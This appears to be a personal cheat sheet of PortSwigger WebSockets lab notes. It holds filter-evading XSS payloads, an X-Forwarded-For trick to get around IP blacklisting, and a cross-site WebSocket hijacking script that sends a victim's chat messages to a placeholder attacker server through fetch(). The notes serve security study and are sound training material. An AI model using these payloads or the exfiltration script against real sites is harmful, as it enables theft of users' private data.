# WebSockets


## Summary

* [Recon for WebSockets](#recon)

* [Portswigger Labs Cheat Sheet / Payloads](#cheat-sheet)

* **View the .pdf file in the folder for more details, the file can be viewed inline without needing to download it**

<br>

## Resources

* https://portswigger.net/web-security/websockets

<br>

## Recon


### Identify WebSockets Requests

* On the Proxy tab in Burp Suite, there is a “WebSockets history” section.  This section will contain any WebSockets messages initiated by the application.  If this section has any requests, then the application is using WebSockets.

* After identifying that WebSockets are in use, the 3 labs on this document can help to formulate ideas to attack the application.

<br>

## Cheat Sheet

### XSS Exploit

* Submit an XSS payload within a parameter in the WebSocket message.  The application is returning this value without any input validation or encoding, and it is between some HTML tags, so the data is executed as JavaScript code.

<br>

### XSS Exploit + Brute Force Bypass

* Use the WebSockets to exploit an XSS vulnerability.  If the application is blacklisting your IP address, try using the X-Forwarded-For header to spoof the IP address.  Try a variety of different payloads depending on how the application responds.  

* Final XSS payload used backticks since the application was not allowing to use parethesis:

   * {"message":"Test\<img src=x oNeRRoR=alert\`1\`\>"}
 
* Another payload that worked was HTML encoding the "alert" keyword:

   * {"message":"\<img src=x OnErRoR=\&#97;\&#108;\&#101;\&#114;\&#116;(1)\>"}
  
<br>

### Cross-site WebSocket Hijacking

* Identify if the WebSockets Handshake request is vulnerable to Cross-Origin WebSocket Hijacking/CSRF attack.  The handshake request can be identified by looking for the following headers in the WebSockets requests:


    * Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==


    * Connection: keep-alive, Upgrade

    
    * Upgrade: websocket


* If the handshake request relies solely on session cookies and does not contain any unpredictable parameters, then it is vulnerable to a CSRF attack.  Depending on how the application uses the WebSocket's, we can perform unauthorized actions or retrieve sensitive data that the user can access.

   * Example:  The payload below can be used to retrieve sensitive information from the application that belongs to another user.  When we send the "READY" command to the server via the WebSocket message, all the past chat messages will be received.  When the messages are received from the server, they will be sent to attacker's server.  This is possible as cross-site websocket hijacking attacks, allows for 2-way interaction, unlike standard CSRF attacks.

```javascript
<script>
    var ws = new WebSocket('wss://VULNERABLE-WEBSOCKET-URL');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://ATTACKER-SERVER', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```


<br><br>

### Pending to complete labs that are missing from cheat sheet:

* All labs in this category are completed and referenced in cheat sheet or attached document.
